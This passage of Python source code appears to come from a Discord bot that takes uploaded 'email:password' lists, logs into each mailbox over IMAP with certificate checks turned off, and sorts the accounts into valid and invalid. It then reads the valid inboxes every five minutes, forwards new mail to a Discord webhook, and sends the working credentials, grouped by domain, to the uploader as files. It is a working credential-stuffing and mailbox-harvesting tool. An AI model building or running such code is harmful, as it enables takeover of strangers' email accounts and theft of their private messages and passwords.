                        results = await asyncio.wait_for(asyncio.gather(*tasks, return_exceptions=True), timeout=30)
                        for result in results:
                            if isinstance(result, int):
                                new_emails_count += result
                            elif isinstance(result, Exception):
                                logger.error(f"Email check error: {result}")
                    except asyncio.TimeoutError:
                        logger.warning("Email monitoring batch timed out")
                        # Cancel remaining tasks
                        for task in tasks:
                            if not task.done():
                                task.cancel()
                    
                    # Small delay between batches
                    await asyncio.sleep(1)
                
                if new_emails_count > 0:
                    # Send private notification to user instead of public channel message
                    try:
                        user = self.current_user
                        if user:
                            await user.send(f"📧 **{new_emails_count} new emails detected and forwarded!**")
                    except Exception as e:
                        logger.error(f"Error sending private email notification: {e}")
                
                await asyncio.sleep(300)  # Wait 5 minutes
                
            except Exception as e:
                logger.error(f"Error in monitoring task for user {user_id}: {str(e)}")
                await asyncio.sleep(60)
    
    async def check_account_for_new_emails_with_timeout(self, account_id, email_addr, password, imap_server, imap_port, user_id):
        """Check account for new emails with timeout wrapper"""
        try:
            # Run in thread pool to avoid blocking
            loop = asyncio.get_event_loop()
            count, emails_data = await loop.run_in_executor(
                None, 
                self.check_account_for_new_emails_sync,
                account_id, email_addr, password, imap_server, imap_port, user_id
            )
            
            # Process emails asynchronously
            if emails_data:
                logger.info(f"📧 Found {len(emails_data)} new emails for {email_addr}")
                for email_data in emails_data:
                    logger.info(f"📧 Processing email from {email_data.get('sender', 'unknown')} to {email_addr}")
                    asyncio.create_task(self.forward_email_to_webhook(user_id, email_data))
            
            return count
        except Exception as e:
            logger.error(f"Error checking emails for {email_addr}: {str(e)}")
            return 0
    
    def check_account_for_new_emails_sync(self, account_id, email_addr, password, imap_server, imap_port, user_id):
        """Synchronous email checking function"""
        try:
            if imap_port == 993:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                mail = imaplib.IMAP4_SSL(imap_server, imap_port, ssl_context=context)
            else:
                mail = imaplib.IMAP4(imap_server, imap_port)
            
            # Set socket timeout
            mail.sock.settimeout(5)
            
            mail.login(email_addr, password)
            mail.select('INBOX')
            
            # Get emails from last 24 hours
            since_date = (datetime.now() - timedelta(days=1)).strftime('%d-%b-%Y')
            status, messages = mail.search(None, f'SINCE {since_date}')
            
            if status != 'OK' or not messages[0]:
                mail.logout()
                return (0, [])
            
            message_ids = messages[0].split()
            new_emails_data = []
            
            # Check last 10 emails max to avoid timeout
            for msg_id in message_ids[-10:]:
                try:
                    status, msg_data = mail.fetch(msg_id, '(RFC822)')
                    if status != 'OK':
                        continue
                    
                    email_body = msg_data[0][1]
                    email_message = email.message_from_bytes(email_body)
                    
                    # Get email details
                    subject = self.decode_mime_words(email_message.get('Subject', ''))
                    sender = email_message.get('From', '')
                    date_received = email_message.get('Date', '')
                    message_id = email_message.get('Message-ID', msg_id.decode())
                    
                    # Parse date properly
                    try:
                        parsed_date = parsedate_to_datetime(date_received)
                    except:
                        parsed_date = datetime.now()
                    
                    # Check if already processed using emails table (more reliable)
                    conn = sqlite3.connect(self.db_path)
                    cursor = conn.cursor()
                    cursor.execute('''
                        SELECT COUNT(*) FROM emails 
                        WHERE account_id = ? AND message_id = ?
                    ''', (account_id, message_id))
                    
                    if cursor.fetchone()[0] > 0:
                        conn.close()
                        continue
                    
                    # Extract email body
                    body_text = self.extract_email_body(email_message)
                    body_html = self.extract_email_html(email_message)
                    
                    # Store email in database
                    cursor.execute('''
                        INSERT INTO emails (account_id, user_id, message_id, subject, sender, recipient, 
                                          date_received, body_text, body_html, folder)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'INBOX')
                    ''', (account_id, user_id, message_id, subject, sender, email_addr, parsed_date, body_text, body_html))
                    
                    conn.commit()
                    email_db_id = cursor.lastrowid
                    conn.close()
                    
                    # Store email data for async processing
                    email_data = {
                        'id': email_db_id,
                        'account_email': email_addr,
                        'sender': sender,
                        'subject': subject,
                        'body_text': body_text,
                        'body_html': body_html,
                        'date_received': parsed_date.isoformat(),
                        'user_id': user_id
                    }
                    new_emails_data.append(email_data)
                    
                except Exception as e:
                    logger.error(f"Error processing email {msg_id}: {e}")
                    continue
            
            mail.logout()
            return (len(new_emails_data), new_emails_data)
            
        except Exception as e:
            logger.error(f"Error checking account {email_addr}: {e}")
            return (0, [])
    
    async def check_account_for_new_emails(self, account_id, email_addr, password, imap_server, imap_port, user_id):
        """Check account for new emails"""
        try:
            if imap_port == 993:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                mail = imaplib.IMAP4_SSL(imap_server, imap_port, ssl_context=context)
            else:
                mail = imaplib.IMAP4(imap_server, imap_port)
            
            mail.login(email_addr, password)
            mail.select('INBOX')
            
            # Search for recent emails
            since_date = (datetime.now() - timedelta(minutes=10)).strftime('%d-%b-%Y')
            status, messages = mail.search(None, f'SINCE {since_date}')
            
            if not messages[0]:
                mail.logout()
                return 0
            
            message_ids = messages[0].split()
            new_emails_count = 0
            
            for msg_id in message_ids[-10:]:
                try:
                    status, msg_data = mail.fetch(msg_id, '(RFC822)')
                    email_message = email.message_from_bytes(msg_data[0][1])
                    
                    message_id = email_message.get('Message-ID', '')
                    subject = self.decode_header_value(email_message.get('Subject', ''))
                    sender = email_message.get('From', '')
                    date_received = email_message.get('Date', '')
                    
                    try:
                        parsed_date = parsedate_to_datetime(date_received)
                    except:
                        parsed_date = datetime.now()
                    
                    # Check if email already exists
                    conn = sqlite3.connect(self.db_path)
                    cursor = conn.cursor()
                    cursor.execute('SELECT id FROM emails WHERE account_id = ? AND message_id = ?', 
                                 (account_id, message_id))
                    
                    if cursor.fetchone():
                        conn.close()
                        continue
                    
                    body_text = self.extract_email_body(email_message)
                    
                    # Store new email
                    cursor.execute('''
                        INSERT INTO emails (account_id, user_id, message_id, subject, sender, recipient, 
                                          date_received, body_text, folder)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'INBOX')
                    ''', (account_id, user_id, message_id, subject, sender, email_addr, parsed_date, body_text))
                    
                    conn.commit()
                    email_db_id = cursor.lastrowid
                    conn.close()
                    
                    # Forward to webhook
                    await self.forward_email_to_webhook(user_id, {
                        'id': email_db_id,
                        'account_email': email_addr,
                        'subject': subject,
                        'sender': sender,
                        'date_received': parsed_date.isoformat(),
                        'body_text': body_text[:1000] + '...' if len(body_text) > 1000 else body_text
                    })
                    
                    new_emails_count += 1
                    
                except Exception as e:
                    logger.error(f"Error processing email {msg_id}: {str(e)}")
                    continue
            
            mail.logout()
            return new_emails_count
            
        except Exception as e:
            logger.error(f"Error checking account {email_addr}: {str(e)}")
            return 0
    
    def decode_header_value(self, value):
        """Decode email header value"""
        if not value:
            return ''
        
        try:
            decoded_parts = decode_header(value)
            decoded_value = ''
            for part, encoding in decoded_parts:
                if isinstance(part, bytes):
                    decoded_value += part.decode(encoding or 'utf-8', errors='ignore')
                else:
                    decoded_value += part
            return decoded_value
        except:
            return str(value)
    
    def extract_email_body(self, email_message):
        """Extract clean text body from email, removing HTML"""
        import re
        from html import unescape
        
        body = ''
        
        if email_message.is_multipart():
            # Try to get plain text first
            for part in email_message.walk():
                if part.get_content_type() == 'text/plain':
                    try:
                        body = part.get_payload(decode=True).decode('utf-8', errors='ignore')
                        break
                    except:
                        continue
            
            # If no plain text, get HTML and convert
            if not body:
                for part in email_message.walk():
                    if part.get_content_type() == 'text/html':
                        try:
                            html_body = part.get_payload(decode=True).decode('utf-8', errors='ignore')
                            body = self.html_to_text(html_body)
                            break
                        except:
                            continue
        else:
            try:
                payload = email_message.get_payload(decode=True).decode('utf-8', errors='ignore')
                if email_message.get_content_type() == 'text/html':
                    body = self.html_to_text(payload)
                else:
                    body = payload
            except:
                body = str(email_message.get_payload())
        
        return body.strip()
    
    def extract_email_html(self, email_message):
        """Extract HTML body from email"""
        html_body = ''
        
        if email_message.is_multipart():
            for part in email_message.walk():
                if part.get_content_type() == 'text/html':
                    try:
                        html_body = part.get_payload(decode=True).decode('utf-8', errors='ignore')
                        break
                    except:
                        continue
        else:
            if email_message.get_content_type() == 'text/html':
                try:
                    html_body = email_message.get_payload(decode=True).decode('utf-8', errors='ignore')
                except:
                    html_body = str(email_message.get_payload())
        
        return html_body.strip()
    
    def html_to_text(self, html_content):
        """Convert HTML to clean text"""
        import re
        from html import unescape
        
        if not html_content:
            return ''
        
        # Remove script and style elements
        html_content = re.sub(r'<script[^>]*>.*?</script>', '', html_content, flags=re.DOTALL | re.IGNORECASE)
        html_content = re.sub(r'<style[^>]*>.*?</style>', '', html_content, flags=re.DOTALL | re.IGNORECASE)
        
        # Convert common HTML elements to text equivalents
        html_content = re.sub(r'<br[^>]*>', '\n', html_content, flags=re.IGNORECASE)
        html_content = re.sub(r'<p[^>]*>', '\n', html_content, flags=re.IGNORECASE)
        html_content = re.sub(r'</p>', '\n', html_content, flags=re.IGNORECASE)
        html_content = re.sub(r'<div[^>]*>', '\n', html_content, flags=re.IGNORECASE)
        html_content = re.sub(r'</div>', '\n', html_content, flags=re.IGNORECASE)
        
        # Remove all remaining HTML tags
        html_content = re.sub(r'<[^>]+>', '', html_content)
        
        # Decode HTML entities
        html_content = unescape(html_content)
        
        # Clean up whitespace
        html_content = re.sub(r'\n\s*\n', '\n\n', html_content)  # Multiple newlines to double
        html_content = re.sub(r'[ \t]+', ' ', html_content)  # Multiple spaces to single
        html_content = html_content.strip()
        
        return html_content
    
    def detect_language(self, text):
        """Simple language detection based on common patterns"""
        if not text or len(text.strip()) < 10:
            return 'en'
        
        # Common patterns for different languages
        spanish_patterns = [r'\b(el|la|los|las|de|en|con|por|para|que|es|son|está|están|hola|gracias)\b']
        french_patterns = [r'\b(le|la|les|de|du|des|avec|pour|que|est|sont|bonjour|merci)\b']
        german_patterns = [r'\b(der|die|das|den|dem|des|mit|für|und|ist|sind|hallo|danke)\b']
        italian_patterns = [r'\b(il|la|lo|gli|le|di|da|in|con|per|che|è|sono|ciao|grazie)\b']
        portuguese_patterns = [r'\b(o|a|os|as|de|em|com|por|para|que|é|são|olá|obrigado)\b']
        
        text_lower = text.lower()
        
        # Count matches for each language
        spanish_count = sum(len(re.findall(pattern, text_lower, re.IGNORECASE)) for pattern in spanish_patterns)
        french_count = sum(len(re.findall(pattern, text_lower, re.IGNORECASE)) for pattern in french_patterns)
        german_count = sum(len(re.findall(pattern, text_lower, re.IGNORECASE)) for pattern in german_patterns)
        italian_count = sum(len(re.findall(pattern, text_lower, re.IGNORECASE)) for pattern in italian_patterns)
        portuguese_count = sum(len(re.findall(pattern, text_lower, re.IGNORECASE)) for pattern in portuguese_patterns)
        
        # Determine most likely language
        counts = {
            'es': spanish_count,
            'fr': french_count,
            'de': german_count,
            'it': italian_count,
            'pt': portuguese_count
        }
        
        max_lang = max(counts, key=counts.get)
        if counts[max_lang] >= 2:  # At least 2 matches to be confident
            return max_lang
        
        return 'en'  # Default to English
    
    async def translate_text(self, text, target_lang='en'):
        """Translate text to target language using Free Translate API"""
        if not text or len(text.strip()) < 3:
            return text
        
        try:
            # Use Free Translate API with auto-detection
            url = "https://ftapi.pythonanywhere.com/translate"
            params = {
                'dl': target_lang,
                'text': text[:1000]  # Limit to 1000 chars
            }
            
            response = requests.get(url, params=params, timeout=10)
            if response.status_code == 200:
                result = response.json()
                if result and 'destination-text' in result:
                    translated = result['destination-text']
                    source_lang = result.get('source-language', 'unknown')
                    
                    # Check if translation is needed (same language)
                    if source_lang == target_lang:
                        return text
                    
                    if translated and translated.strip() and translated != text:
                        return f"{translated}\n\n*[Auto-translated from {source_lang.upper()}]*"
            
        except Exception as e:
            logger.error(f"Translation error: {e}")
        
        return text  # Return original if translation fails
    
    async def should_monitor_sender(self, user_id, sender_email):
        """Check if we should monitor emails from this sender"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM monitor_filters WHERE user_id = ? AND is_active = 1', (user_id,))
        filter_count = cursor.fetchone()[0]
        
        logger.info(f"📋 Monitor filters for user {user_id}: {filter_count} active filters")
        
        # If no filters set, monitor all emails
        if filter_count == 0:
            logger.info(f"✅ No filters set - monitoring all emails for user {user_id}")
            conn.close()
            return True
        
        # Check if sender is in filter list
        cursor.execute('SELECT COUNT(*) FROM monitor_filters WHERE user_id = ? AND sender_email = ? AND is_active = 1', 
                      (user_id, sender_email.lower()))
        is_monitored = cursor.fetchone()[0] > 0
        
        # Also get the list of monitored senders for debugging
        cursor.execute('SELECT sender_email FROM monitor_filters WHERE user_id = ? AND is_active = 1', (user_id,))
        monitored_senders = [row[0] for row in cursor.fetchall()]
        logger.info(f"📋 Monitored senders for user {user_id}: {monitored_senders}")
        logger.info(f"📋 Checking sender '{sender_email.lower()}' - is monitored: {is_monitored}")
        
        conn.close()
        
        return is_monitored
    
    def get_email_domain(self, email_addr):
        """Extract domain from email address"""
        try:
            return email_addr.split('@')[1].lower()
        except:
            return 'unknown'
    
    def organize_emails_by_domain(self, user_id, processed_account_ids=None):
        """Organize valid emails by domain and create separate files"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Get valid accounts - either from processed IDs or all accounts
            if processed_account_ids:
                placeholders = ','.join(['?' for _ in processed_account_ids])
                cursor.execute(f'''
                    SELECT email, password, status FROM accounts 
                    WHERE id IN ({placeholders}) AND status = 'active'
                    ORDER BY email
                ''', processed_account_ids)
            else:
                cursor.execute('''
                    SELECT email, password, status FROM accounts 
                    WHERE user_id = ? AND status = 'active'
                    ORDER BY email
                ''', (user_id,))
            
            valid_accounts = cursor.fetchall()
            conn.close()
            
            if not valid_accounts:
                return {}
            
            # Group accounts by domain
            domain_groups = {}
            for email_addr, password, status in valid_accounts:
                domain = self.get_email_domain(email_addr)
                if domain not in domain_groups:
                    domain_groups[domain] = []
                domain_groups[domain].append(f"{email_addr}:{password}")
            
            # Separate large domains (>5 accounts) from small ones (≤5 accounts)
            large_domains = {}
            small_domains = {}
            
            for domain, accounts in domain_groups.items():
                if len(accounts) > 5:
                    large_domains[domain] = accounts
                else:
                    small_domains[domain] = accounts
            
            domain_files = {}
            
            # Create individual files for large domains
            for domain, accounts in large_domains.items():
                filename = f"valid_{domain.replace('.', '_')}.txt"
                filepath = os.path.join(tempfile.gettempdir(), filename)
                
                with open(filepath, 'w', encoding='utf-8') as f:
                    f.write(f"# Valid accounts for domain: {domain}\n")
                    f.write(f"# Total accounts: {len(accounts)}\n")
                    f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                    for account in accounts:
                        f.write(f"{account}\n")
                
                domain_files[domain] = {
                    'filepath': filepath,
                    'filename': filename,
                    'count': len(accounts),
                    'type': 'large_domain'
                }
                
                logger.info(f"Created domain file for {domain}: {len(accounts)} accounts")
            
            # Create CSV file for small domains (≤5 accounts each)
            if small_domains:
                import csv
                filename = "valid_small_domains.csv"
                filepath = os.path.join(tempfile.gettempdir(), filename)
                
                total_small_accounts = sum(len(accounts) for accounts in small_domains.values())
                
                with open(filepath, 'w', newline='', encoding='utf-8') as csvfile:
                    writer = csv.writer(csvfile)
                    
                    # Write header
                    writer.writerow(['Email', 'Password', 'Domain', 'Domain_Account_Count'])
                    
                    # Write accounts grouped by domain
                    for domain in sorted(small_domains.keys()):
                        accounts = small_domains[domain]
                        for account in accounts:
                            email_addr, password = account.split(':', 1)
                            writer.writerow([email_addr, password, domain, len(accounts)])
                
                domain_files['small_domains'] = {
                    'filepath': filepath,
                    'filename': filename,
                    'count': total_small_accounts,
                    'domain_count': len(small_domains),
                    'type': 'small_domains_csv'
                }
                
                logger.info(f"Created CSV file for {len(small_domains)} small domains: {total_small_accounts} total accounts")
            
            return domain_files
            
        except Exception as e:
            logger.error(f"Error organizing emails by domain: {e}")
            return {}
    
    async def send_domain_separated_results(self, user, user_id, processed_account_ids=None):
        """Send domain-separated results to user's DM"""
        try:
            logger.info(f"Starting domain separation for user {user_id}")
            
            # Organize emails by domain
            domain_files = self.organize_emails_by_domain(user_id, processed_account_ids)
            logger.info(f"Domain organization returned {len(domain_files)} domains")
            
            if not domain_files:
                logger.warning("No domain files created")
                await user.send("❌ No valid accounts found to organize by domain.")
                return
            
            # Send summary embed
            embed = discord.Embed(
                title="📧 Domain-Separated Email Results",
                description=f"Your valid emails have been organized by domain:",
                color=0x00ff00
            )
            
            total_accounts = sum(data['count'] for data in domain_files.values())
            embed.add_field(
                name="📊 Summary",
                value=f"**Total Valid Accounts:** {total_accounts}\n**Domains Found:** {len(domain_files)}",
                inline=False
            )
            
            # Add domain breakdown (limit to avoid embed size issues)
            domain_list = []
            large_domains = []
            small_domains_info = None
            
            for domain, data in domain_files.items():
                if data.get('type') == 'small_domains_csv':
                    small_domains_info = data
                else:
                    large_domains.append((domain, data))
            
            # Sort large domains by account count
            large_domains.sort(key=lambda x: x[1]['count'], reverse=True)
            
            # Show large domains first
            for domain, data in large_domains[:15]:  # Show top 15 large domains
                domain_list.append(f"**@{domain}:** {data['count']} accounts")
            
            # Add small domains summary
            if small_domains_info:
                domain_list.append(f"**📊 Small Domains (≤5 accounts):** {small_domains_info['count']} accounts across {small_domains_info['domain_count']} domains")
            
            if len(large_domains) > 15:
                domain_list.append(f"... and {len(large_domains) - 15} more large domains")
            
            embed.add_field(
                name="🌐 Domain Breakdown",
                value="\n".join(domain_list),
                inline=False
            )
            
            logger.info("Sending summary embed")
            await user.send(embed=embed)
            
            # Send each domain file (limit to avoid spam)
            files_sent = 0
            
            # Send large domain files first
            for domain, data in large_domains:
                if files_sent >= 25:  # Discord rate limit protection for large domains
                    await user.send(f"⚠️ **Rate limit reached!** Only showing first 25 large domain files. Total large domains: {len(large_domains)}")
                    break
                    
                try:
                    logger.info(f"Sending file for large domain {domain} ({data['count']} accounts)")
                    
                    with open(data['filepath'], 'rb') as f:
                        file = discord.File(f, filename=data['filename'])
                        await user.send(
                            f"📁 **@{domain}** ({data['count']} accounts):",
                            file=file
                        )
                    
                    files_sent += 1
                    
                    # Clean up temporary file
                    os.remove(data['filepath'])
                    logger.info(f"Successfully sent and cleaned up file for {domain}")
                    
                except Exception as e:
                    logger.error(f"Error sending domain file for {domain}: {e}")
                    await user.send(f"❌ Error sending file for domain @{domain}")
            
            # Send small domains CSV file
            if small_domains_info:
                try:
                    logger.info(f"Sending CSV file for small domains ({small_domains_info['count']} accounts across {small_domains_info['domain_count']} domains)")
                    
                    with open(small_domains_info['filepath'], 'rb') as f:
                        file = discord.File(f, filename=small_domains_info['filename'])
                        await user.send(
                            f"📊 **Small Domains CSV** ({small_domains_info['count']} accounts across {small_domains_info['domain_count']} domains):\n"
                            f"*Contains all domains with 5 or fewer accounts*",
                            file=file
                        )
                    
                    files_sent += 1
                    
                    # Clean up temporary file
                    os.remove(small_domains_info['filepath'])
                    logger.info(f"Successfully sent and cleaned up CSV file for small domains")
                    
                except Exception as e:
                    logger.error(f"Error sending small domains CSV file: {e}")
                    await user.send(f"❌ Error sending small domains CSV file")
            
            logger.info(f"Successfully sent {files_sent} domain-separated files for user {user_id}")
            
        except Exception as e:
            logger.error(f"Error sending domain-separated results: {e}")
            import traceback
            logger.error(f"Full traceback: {traceback.format_exc()}")
            try:
                await user.send("❌ Error organizing emails by domain. Please try again.")
            except Exception as dm_error:
                logger.error(f"Could not send error message to user: {dm_error}")

    async def forward_email_to_webhook(self, user_id, email_data):
        """Forward email to webhook with translation"""
        logger.info(f"🔗 Attempting to forward email from {email_data['sender']} to webhook for user {user_id}")
        
        # Check if we should monitor this sender
        should_monitor = await self.should_monitor_sender(user_id, email_data['sender'])
        logger.info(f"📋 Should monitor sender {email_data['sender']}: {should_monitor}")
        
        if not should_monitor:
            logger.info(f"❌ Skipping email from {email_data['sender']} - not in monitor filters")
            return
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('SELECT url FROM webhooks WHERE user_id = ? AND is_active = 1', (user_id,))
        result = cursor.fetchone()
        conn.close()
        
        if not result:
            logger.warning(f"❌ No active webhook found for user {user_id}")
            return
        
        logger.info(f"✅ Found webhook URL for user {user_id}")
        
        webhook_url = result[0]
        
        # Translate email content to English
        translated_subject = await self.translate_text(email_data["subject"])
        translated_body = await self.translate_text(email_data["body_text"])
        
        payload = {
            'embeds': [{
                'title': f'📧 New Email: {translated_subject}',
                'color': 0x00ff00,
                'fields': [
                    {'name': 'Account', 'value': email_data['account_email'], 'inline': True},
                    {'name': 'From', 'value': email_data['sender'], 'inline': True},
                    {'name': 'Date', 'value': email_data['date_received'], 'inline': True},
                    {'name': 'Preview', 'value': translated_body[:500] + '...' if len(translated_body) > 500 else translated_body, 'inline': False}
                ],
                'timestamp': email_data['date_received']
            }]
        }
        
        try:
            response = requests.post(webhook_url, json=payload, timeout=10)
            if response.status_code == 204:
                # Mark as forwarded
                conn = sqlite3.connect(self.db_path)
                cursor = conn.cursor()
                cursor.execute('UPDATE emails SET forwarded = 1 WHERE id = ?', (email_data['id'],))
                conn.commit()
                conn.close()
        except Exception as e:
            logger.error(f"Error forwarding email to webhook: {str(e)}")
    
    def set_webhook_url(self, user_id, url):
        """Set webhook URL for user"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT OR REPLACE INTO webhooks (user_id, url, webhook_type, is_active)
            VALUES (?, ?, 'discord', 1)
        ''', (user_id, url))
        
        conn.commit()
        conn.close()
        
        self.webhook_urls[user_id] = url
        return 'discord'
    
    def get_stats(self, user_id):
        """Get statistics for user"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute("SELECT status, COUNT(*) FROM accounts WHERE user_id = ? GROUP BY status", (user_id,))
        account_stats = dict(cursor.fetchall())
        
        cursor.execute("SELECT COUNT(*) FROM emails WHERE user_id = ?", (user_id,))
        total_emails = cursor.fetchone()[0]
        
        cursor.execute("""
            SELECT DATE(created_at) as date, COUNT(*) as count 
            FROM emails 
            WHERE user_id = ? AND created_at >= date('now', '-7 days')
            GROUP BY DATE(created_at)
            ORDER BY date DESC
        """, (user_id,))
        recent_activity = cursor.fetchall()
        
        conn.close()
        
        return {
            'account_stats': account_stats,
            'total_emails': total_emails,
            'recent_activity': recent_activity,
            'login_in_progress': self.login_in_progress.get(user_id, False),
            'login_stats': self.login_stats.get(user_id, {})
        }

# Initialize email manager
email_manager = EmailManager()

@bot.event
async def on_ready():
    print(f'🤖 {bot.user} has connected to Discord!')
    print(f'📧 Email Management Bot is ready!')
    print(f'🔗 Invite link: https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions={PERMISSIONS_INTEGER}&scope=bot%20applications.commands')
    
    try:
        synced = await bot.tree.sync()
        print(f"✅ Synced {len(synced)} slash commands")
    except Exception as e:
        print(f"❌ Failed to sync commands: {e}")

@bot.tree.command(name='upload', description='Upload email:password list for validation')
async def upload_emails(interaction: discord.Interaction, file: discord.Attachment):
    """Upload email:password list for validation"""
    print(f"🔍 Upload command triggered by {interaction.user} with file: {file.filename}")
    
    if not file.filename.endswith('.txt'):
        embed = discord.Embed(
            title="❌ Invalid File Type",
            description="Please upload a .txt file containing email:password combinations",
            color=0xff0000
        )
        embed.add_field(name="Format", value="```\nemail1@example.com:password1\nemail2@example.com:password2\n```", inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    try:
        # Respond immediately
        embed = discord.Embed(
            title="📁 File Received",
            description=f"Processing uploaded file: **{file.filename}**\nThis may take a few moments...",
            color=0x0099ff
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        
        # Read file content
        print(f"📁 Reading file content...")
        file_content = await file.read()
        email_list = file_content.decode('utf-8', errors='ignore')
        print(f"📧 Found {len(email_list.strip().split())} lines in file")
        
        # Store user for DM results
        email_manager.current_user = interaction.user
        
        # Process email list in background
        print(f"🚀 Starting background task for email processing...")
        asyncio.create_task(email_manager.process_email_list(interaction.user.id, email_list, interaction.channel))
        
    except Exception as e:
        embed = discord.Embed(
            title="❌ Error Processing File",
            description=f"Error: {str(e)}",
            color=0xff0000
        )
        if not interaction.response.is_done():
            await interaction.response.send_message(embed=embed)
        else:
            await interaction.followup.send(embed=embed)

@bot.tree.command(name='webhook', description='Set webhook URL for email forwarding')
async def set_webhook(interaction: discord.Interaction, url: str):
    """Set webhook URL for email forwarding"""
    if not url.startswith('https://discord.com/api/webhooks/'):
        embed = discord.Embed(
            title="❌ Invalid Webhook URL",
            description="Please provide a valid Discord webhook URL",
            color=0xff0000
        )
        embed.add_field(name="Example", value="```https://discord.com/api/webhooks/...```", inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    try:
        # Respond immediately
        embed = discord.Embed(
            title="🔗 Testing Webhook",
            description="Testing webhook URL and configuring...",
            color=0x0099ff
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        
        # Test webhook
        test_payload = {
            'embeds': [{
                'title': '✅ Webhook Test',
                'description': 'Your webhook has been configured successfully!',
                'color': 0x00ff00,
                'timestamp': datetime.now().isoformat()
            }]
        }
        
        response = requests.post(url, json=test_payload, timeout=5)
        
        if response.status_code == 204:
            email_manager.set_webhook_url(interaction.user.id, url)
            embed = discord.Embed(
                title="✅ Webhook Configured",
                description="Webhook URL set successfully! New emails will be forwarded here.",
                color=0x00ff00
            )
            await interaction.followup.send(embed=embed, ephemeral=True)
        else:
            embed = discord.Embed(
                title="❌ Webhook Test Failed",
                description=f"Webhook returned status code: {response.status_code}",
                color=0xff0000
            )
            await interaction.followup.send(embed=embed, ephemeral=True)
            
    except Exception as e:
        embed = discord.Embed(
            title="❌ Error Setting Webhook",
            description=f"Error: {str(e)}",
            color=0xff0000
        )
        await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name='stats', description='Show email account statistics')
async def show_stats(interaction: discord.Interaction):
    """Show email account statistics"""
    try:
        stats = email_manager.get_stats(interaction.user.id)
        
        embed = discord.Embed(
            title="📊 Email Account Statistics",
            color=0x00ff00
        )
        
        account_stats = stats['account_stats']
        total_accounts = sum(account_stats.values())
        
        if total_accounts > 0:
            embed.add_field(name="Total Accounts", value=str(total_accounts), inline=True)
            embed.add_field(name="✅ Valid", value=str(account_stats.get('active', 0)), inline=True)
            embed.add_field(name="❌ Invalid", value=str(account_stats.get('failed', 0)), inline=True)
            embed.add_field(name="⏳ Pending", value=str(account_stats.get('pending', 0)), inline=True)
            embed.add_field(name="📧 Total Emails", value=str(stats['total_emails']), inline=True)
            
            if account_stats.get('active', 0) > 0:
                success_rate = (account_stats.get('active', 0) / total_accounts) * 100
                embed.add_field(name="Success Rate", value=f"{success_rate:.1f}%", inline=True)
        else:
            embed.add_field(name="Status", value="No accounts uploaded yet", inline=False)
            embed.add_field(name="Get Started", value="Use `/upload` to upload your email list", inline=False)
        
        if stats['login_in_progress']:
            login_stats = stats['login_stats']
            progress = (login_stats['processed'] / login_stats['total']) * 100 if login_stats['total'] > 0 else 0
            embed.add_field(name="🔄 Validation Progress", value=f"{progress:.1f}% ({login_stats['processed']}/{login_stats['total']})", inline=False)
        
        await interaction.response.send_message(embed=embed, ephemeral=True)
        
    except Exception as e:
        await interaction.response.send_message(f"❌ Error retrieving stats: {str(e)}", ephemeral=True)

@bot.tree.command(name='stop', description='Stop ongoing email validation')
async def stop_validation(interaction: discord.Interaction):
    """Stop ongoing email validation"""
    user_id = interaction.user.id
    
    if not email_manager.login_in_progress.get(user_id, False):
        await interaction.response.send_message("❌ No validation process is currently running!", ephemeral=True)
        return
    
    email_manager.stop_login_requested[user_id] = True
    await interaction.response.send_message("⏹️ **Stopping email validation...** This may take a moment to complete current batch.", ephemeral=True)

class AccountsPaginator(discord.ui.View):
    def __init__(self, accounts, user_id):
        super().__init__(timeout=300)  # 5 minute timeout
        self.accounts = accounts
        self.user_id = user_id
        self.current_page = 0
        self.accounts_per_page = 15
        self.total_pages = (len(accounts) - 1) // self.accounts_per_page + 1
        
    def get_embed(self):
        start_idx = self.current_page * self.accounts_per_page
        end_idx = min(start_idx + self.accounts_per_page, len(self.accounts))
        page_accounts = self.accounts[start_idx:end_idx]
        
        embed = discord.Embed(
            title="🟢 Valid Email Accounts Being Monitored",
            description=f"All {len(self.accounts)} accumulated accounts from your uploads are actively monitored for new emails every 5 minutes",
            color=0x00ff00
        )
        
        # Format accounts with green dots
        account_list = []
        for email, total_emails in page_accounts:
            email_count_text = f"{total_emails:,} emails" if total_emails and total_emails > 0 else "0 emails"
            account_list.append(f"🟢 `{email}` - {email_count_text}")
        
        embed.add_field(
            name=f"📧 Active Accounts ({start_idx + 1}-{end_idx} of {len(self.accounts)})",
            value="\n".join(account_list) if account_list else "No accounts",
            inline=False
        )
        
        embed.add_field(
            name="📊 Summary",
            value=f"**✅ Valid Accounts:** {len(self.accounts)}\n**📧 Currently Showing:** {len(page_accounts)} accounts\n**🔄 Monitoring Status:** Active",
            inline=False
        )
        
        embed.set_footer(text=f"Page {self.current_page + 1}/{self.total_pages} • Use /monitor to set up selective email filtering")
        return embed
    
    @discord.ui.button(label='◀️ Previous', style=discord.ButtonStyle.secondary, disabled=True)
    async def previous_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.current_page -= 1
        
        # Update button states
        self.previous_button.disabled = (self.current_page == 0)
        self.next_button.disabled = (self.current_page >= self.total_pages - 1)
        
        await interaction.response.edit_message(embed=self.get_embed(), view=self)
    
    @discord.ui.button(label='▶️ Next', style=discord.ButtonStyle.secondary)
    async def next_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.current_page += 1
        
        # Update button states
        self.previous_button.disabled = (self.current_page == 0)
        self.next_button.disabled = (self.current_page >= self.total_pages - 1)
        
        await interaction.response.edit_message(embed=self.get_embed(), view=self)
    
    @discord.ui.button(label='🔄 Refresh', style=discord.ButtonStyle.primary)
